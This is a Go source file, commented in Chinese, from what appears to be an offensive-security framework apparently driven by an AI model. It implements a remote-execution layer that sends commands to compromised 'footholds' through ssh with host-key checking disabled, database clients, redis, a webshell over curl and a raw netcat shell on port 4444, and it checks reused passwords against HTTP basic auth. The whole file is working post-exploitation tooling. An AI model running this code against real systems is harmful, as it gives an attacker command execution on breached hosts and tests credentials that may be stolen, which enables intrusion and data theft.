// Package remote 是「远程执行」层：把命令送到立足点（ssh / 数据库 / webshell / raw shell），
// 而不是在操作机上执行。秘密只进环境变量或 stdin，不进命令行参数、不进返回结果。
//
// 支持：
//   - ssh      : sshpass -e ssh …（密码走 SSHPASS 环境变量）
//   - mysql    : mysql -e …（MYSQL_PWD）
//   - postgres : psql -c …（PGPASSWORD）
//   - redis    : redis-cli …（REDISCLI_AUTH）
//   - webshell/admin(http): curl --data-urlencode "<param>=<cmd>"
//   - shell    : nc host port（命令走 stdin，尾部加结束哨兵）
//   - httpbasic: curl -K -（Basic 认证配置走 stdin，用于后台口令复用验证）
//
// 不支持的协议（vpn / jump）直接报错，绝不退化成"操作机本地执行"。
package remote

import (
	"context"
	"fmt"
	"net"
	"os/exec"
	"strconv"
	"strings"
	"time"

	"github.com/Autumn-27/artex/internal/egress"
)

// Target 是一个立足点的连接参数（Secret 只在内存里）。
type Target struct {
	Proto    string `json:"proto"`
	Host     string `json:"host"`
	Port     int    `json:"port,omitempty"`
	User     string `json:"user,omitempty"`
	Endpoint string `json:"endpoint,omitempty"` // webshell/admin 的完整 URL
	CmdParam string `json:"cmd_param,omitempty"`
	Secret   string `json:"-"`
	KeyPath  string `json:"key_path,omitempty"`
}

// shellEnd 是 raw shell 的结束哨兵。
const shellEnd = "__ARTEX_END__"

// Supports 判断协议是否可远程执行。
func Supports(proto string) bool {
	switch strings.ToLower(strings.TrimSpace(proto)) {
	case "ssh", "db", "mysql", "postgres", "postgresql", "redis",
		"webshell", "admin", "shell", "httpbasic":
		return true
	}
	return false
}

// Exec 在目标上执行一条命令。调用方必须先过 execx.Validate。
func Exec(ctx context.Context, t Target, command string, timeout time.Duration) (string, error) {
	if !Supports(t.Proto) {
		return "", fmt.Errorf("remote: 协议 %q 不支持远程执行（请把会话改为 ssh/webshell/db/shell）", t.Proto)
	}
	if strings.TrimSpace(command) == "" {
		return "", fmt.Errorf("remote: 命令为空")
	}
	if timeout <= 0 {
		timeout = 120 * time.Second
	}
	if err := egress.Guard(ctx); err != nil {
		return "", fmt.Errorf("出口未就绪，拒绝执行：%w", err)
	}
	c, cancel := context.WithTimeout(ctx, timeout)
	defer cancel()

	name, args, env, stdin, err := build(t, command)
	if err != nil {
		return "", err
	}
	cmd := exec.CommandContext(c, name, args...)
	cmd.Env = append(env, egress.ProxyEnv...)
	if stdin != "" {
		cmd.Stdin = strings.NewReader(stdin)
	}
	out, err := cmd.CombinedOutput()
	if len(out) > 512*1024 {
		out = out[:512*1024]
	}
	text := string(out)
	if strings.EqualFold(strings.TrimSpace(t.Proto), "shell") {
		// 去掉哨兵与回显，只留命令输出。
		if i := strings.Index(text, shellEnd); i >= 0 {
			text = text[:i]
		}
	}
	return text, err
}

// build 只构造命令（便于单测；不执行）。stdin 用于秘密/命令投递。
func build(t Target, command string) (name string, args, env []string, stdin string, err error) {
	proto := strings.ToLower(strings.TrimSpace(t.Proto))
	host := strings.TrimSpace(t.Host)
	if host == "" {
		host = hostOf(t.Endpoint)
	}
	switch proto {
	case "ssh":
		a := []string{"-o", "StrictHostKeyChecking=no", "-o", "UserKnownHostsFile=/dev/null",
			"-o", "ConnectTimeout=8", "-o", "BatchMode=no"}
		if t.Port > 0 {
			a = append(a, "-p", strconv.Itoa(t.Port))
		}
		if t.KeyPath != "" {
			a = append(a, "-i", t.KeyPath)
		}
		dest := host
		if t.User != "" {
			dest = t.User + "@" + host
		}
		a = append(a, dest, "--", command)
		if t.Secret != "" {
			return "sshpass", append([]string{"-e", "ssh"}, a...), []string{"SSHPASS=" + t.Secret}, "", nil
		}
		return "ssh", a, nil, "", nil
	case "db", "mysql":
		port := t.Port
		if port == 0 {
			port = 3306
		}
		a := []string{"-h", host, "-P", strconv.Itoa(port), "-e", command}
		if t.User != "" {
			a = append([]string{"-u", t.User}, a...)
		}
		return "mysql", a, []string{"MYSQL_PWD=" + t.Secret}, "", nil
	case "postgres", "postgresql":
		port := t.Port
		if port == 0 {
			port = 5432
		}
		a := []string{"-h", host, "-p", strconv.Itoa(port), "-c", command}
		if t.User != "" {
			a = append(a, "-U", t.User)
		}
		return "psql", a, []string{"PGPASSWORD=" + t.Secret}, "", nil
	case "redis":
		port := t.Port
		if port == 0 {
			port = 6379
		}
		return "redis-cli", []string{"-h", host, "-p", strconv.Itoa(port), command},
			[]string{"REDISCLI_AUTH=" + t.Secret}, "", nil
	case "webshell", "admin":
		u := strings.TrimSpace(t.Endpoint)
		if u == "" {
			return "", nil, nil, "", fmt.Errorf("remote: webshell 缺少 endpoint URL")
		}
		param := strings.TrimSpace(t.CmdParam)
		if param == "" {
			param = "cmd"
		}
		return "curl", []string{"-s", "-m", "120", "--data-urlencode", param + "=" + command, u}, nil, "", nil
	case "shell":
		port := t.Port
		if port <= 0 {
			port = 4444
		}
		if net.ParseIP(host) == nil && strings.TrimSpace(host) == "" {
			return "", nil, nil, "", fmt.Errorf("remote: shell 缺少 host")
		}
		// 命令走 stdin，避免出现在参数/进程列表；输出读到哨兵为止。
		return "nc", []string{"-w", "15", host, strconv.Itoa(port)}, nil,
			command + "\necho " + shellEnd + "\n", nil
	case "httpbasic":
		port := t.Port
		if port == 0 {
			port = 80
		}
		scheme := "http"
		if port == 443 || port == 8443 {
			scheme = "https"
		}
		u := strings.TrimSpace(t.Endpoint)
		if u == "" {
			u = fmt.Sprintf("%s://%s:%d/", scheme, host, port)
		}
		// Basic 认证配置走 stdin（curl -K -），密码不进参数。
		cfg := fmt.Sprintf("user = \"%s:%s\"\nurl = \"%s\"\n", t.User, t.Secret, u)
		return "curl", []string{"-s", "-o", "/dev/null", "-w", "%{http_code}", "-K", "-",
			"-m", "20"}, nil, cfg, nil
	}
	return "", nil, nil, "", fmt.Errorf("remote: 协议 %q 不支持", t.Proto)
}

func hostOf(endpoint string) string {
	e := strings.TrimSpace(endpoint)
	if i := strings.Index(e, "://"); i >= 0 {
		e = e[i+3:]
	}
	if i := strings.IndexAny(e, "/?#"); i >= 0 {
		e = e[:i]
	}
	if i := strings.LastIndex(e, ":"); i > 0 {
		e = e[:i]
	}
	return e
}

// Redact 把命令里的秘密替换掉（返回给模型/日志/审计前调用）。
func Redact(command, secret string) string {
	if secret == "" {
		return command
	}
	return strings.ReplaceAll(command, secret, "***")
}
